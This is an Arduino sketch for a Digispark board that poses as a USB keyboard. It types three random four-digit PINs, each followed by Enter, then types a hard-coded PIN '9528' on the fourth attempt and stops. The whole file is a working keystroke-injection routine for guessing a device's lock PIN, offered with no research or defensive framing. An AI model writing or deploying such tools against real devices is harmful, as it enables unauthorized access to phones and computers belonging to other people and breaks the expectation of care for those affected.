#include "DigiKeyboard.h"

void setup() {
    // No setup required
    randomSeed(analogRead(0)); // Seed the random number generator
}

void loop() {
    for (int attempt = 1; attempt <= 4; attempt++) {
        String pin;

        if (attempt == 4) {
            // On the 4th attempt, set the pin to 9528
            pin = "9528";
        } else {
            // Generate a random 4-digit number
            int randomPin = random(0, 10000);
            pin = String(randomPin);

            // Ensure the pin is 4 digits by padding with zeros if necessary
            while (pin.length() < 4) {
                pin = "0" + pin;
            }
        }

        // Type the pin
        DigiKeyboard.print(pin);
        
        // Press enter (assuming enter is needed to submit the pin)
        DigiKeyboard.sendKeyStroke(KEY_ENTER);

        // Wait for a bit (adjust the delay as needed)
        delay(1000);
    }

    // If all attempts are tried, stop the loop
    while (true);
}
